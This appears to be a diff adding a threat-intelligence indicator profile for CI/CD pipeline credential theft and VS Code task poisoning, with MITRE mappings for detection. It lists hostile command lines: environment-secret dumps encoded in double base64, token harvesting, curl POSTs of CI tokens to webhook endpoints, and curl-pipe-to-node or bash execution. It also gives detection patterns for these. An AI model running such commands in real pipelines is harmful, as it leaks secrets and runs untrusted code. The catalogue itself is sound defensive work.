@@ -1,0 +1,398 @@
+{
+  "malware_family": "",
+  "threat_actor": "DPRK-linked actors (Lazarus / Contagious Interview); GhostAction, Shai-Hulud, HackerBot-Claw campaigns",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "Adversaries abuse CI/CD pipelines by using stolen developer credentials to modify workflow YAML and harvest the cloud tokens, package registry credentials and deploy keys available to the runner. This profile captures the concrete artefacts behind that tradecraft: Nord Stream double-base64 environment exfiltration, pull_request_target/checkout_ref abuse, GITHUB_ENV and LD_PRELOAD injection, artifact-based GITHUB_TOKEN leakage, and VS Code task poisoning, together with the MITRE ATT&CK mappings Elastic uses for detection.",
+  "mitre_techniques": [
+    "T1552",
+    "T1552.004",
+    "T1195",
+    "T1195.002",
+    "T1070.006",
+    "T1059",
+    "T1098",
+    "T1078"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "env -0 | awk -v RS='0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0",
+      "context": "Nord Stream GitHub Actions payload template, matched verbatim in nord-stream-pipeline-exfil.diff",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "az account get-access-token | base64 -w0 | base64 -w0",
+      "context": "Nord Stream Azure OIDC template run after azure/login@v1 with id-token: write",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "TOKENS=\"${CI_JOB_TOKEN}:${CI_REGISTRY_PASSWORD}\"",
+      "context": "GitLab demo alert: base64-obfuscated credential harvesting in scripts/ci/deploy-tokens.sh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s -X POST \"https://webhook.site/test-endpoint\"",
+      "context": "GitLab demo POST of CI_JOB_TOKEN and CI_REGISTRY_PASSWORD to external endpoint",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "BUILD_META=$(printenv | base64)",
+      "context": "Azure DevOps demo: dumps all env vars incl. SYSTEM_ACCESSTOKEN and AWS keys before POST",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl | node",
+      "context": "Contagious Interview VS Code auto-task payload for silent execution",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl | bash",
+      "context": "Remote script execution listed under supply chain manipulation (curl_pipe_bash)",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "scripts/ci/deploy-tokens.sh",
+      "context": "GitLab demo script containing base64-obfuscated credential harvesting code",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "scripts/ci/warmup-v5.sh",
+      "context": "Demo script POSTing CI tokens on GitHub, GitLab and Azure DevOps",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": ".github/workflows/cache-warmup.yml",
+      "context": "Demo workflow exfiltrating secrets.DEPLOY_KEY via scheduled run",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": ".vscode/tasks.json",
+      "context": "Contagious Interview IDE config that auto-executes on folder open",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": ".git/config",
+      "context": "Leaked with GITHUB_TOKEN when upload-artifact uses path: . (ArtiPACKED)",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/proc/mem",
+      "context": "Self-hosted runner memory scrape for credentials (proc_mem_read signal)",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ssh.js",
+      "context": "Azure DevOps SSH task source file modified by Nord Stream to patch task behaviour",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "permissions: write-all",
+      "context": "Permission escalation broadening blast radius of any workflow compromise",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "id-token: write",
+      "context": "OIDC token minting / permission escalation in workflows",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "path: .",
+      "context": "upload-artifact of the entire workspace leaks .git/config token (ArtiPACKED)",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "runOn: folderOpen",
+      "context": "VS Code task auto-execute trigger in Contagious Interview repos",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "reveal: never",
+      "context": "Hidden presentation of the malicious VS Code task",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "echo: false",
+      "context": "Hides task output in the poisoned .vscode/tasks.json",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "files.exclude",
+      "context": "Entry used to hide the .vscode directory from the developer",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "pull_request_target",
+      "context": "Dangerous trigger granting secrets to untrusted PR code",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "self-hosted",
+      "context": "Jobs redirected to self-hosted runners with internal network access",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "${{.*secrets.",
+      "context": "secrets_context signal: direct secret interpolation in workflows",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ref:.*github.event.pull_request.head.(sha|ref)",
+      "context": "checkout_ref signal: untrusted PR head checked out in a privileged context",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "base64.*|.*base64",
+      "context": "double_base64 signal for log-masking evasion",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "LD_PRELOAD",
+      "context": "GITHUB_ENV injection of LD_PRELOAD for code execution in privileged workflows",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "NODE_OPTIONS",
+      "context": "GITHUB_ENV injection of NODE_OPTIONS to force module loading",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "$GITHUB_ENV",
+      "context": "Untrusted input written to GITHUB_ENV sets arbitrary env vars (github_env_write)",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "$GITHUB_PATH",
+      "context": "Path manipulation via GITHUB_PATH in the injection diff",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "eval()",
+      "context": "Trojanized npm postinstall hook executing base64-encoded URLs",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "azure/login@v1",
+      "context": "OIDC login action used in the Nord Stream Azure exfil template",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "addSpnToEnvironment",
+      "context": "Azure DevOps task input exposing SPN credentials (nord-stream-azure-devops.diff)",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "DownloadSecureFile",
+      "context": "Azure DevOps task abused for secure file theft",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "Nord Stream",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "deploy-tracker.external-service.io",
+      "context": "Azure DevOps demo pipeline POSTs base64 env dump (incl. System.AccessToken) here",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://webhook.site/test-endpoint",
+      "context": "GitLab demo POST target for CI_JOB_TOKEN and CI_REGISTRY_PASSWORD",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "webhook.site",
+      "context": "Public request-capture service used as exfil drop in demo diff",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://webhooks.example.com/api/release",
+      "context": "GitHub demo workflow POSTs AWS/NPM/SSH secrets to this endpoint",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script"
+  ]
+}
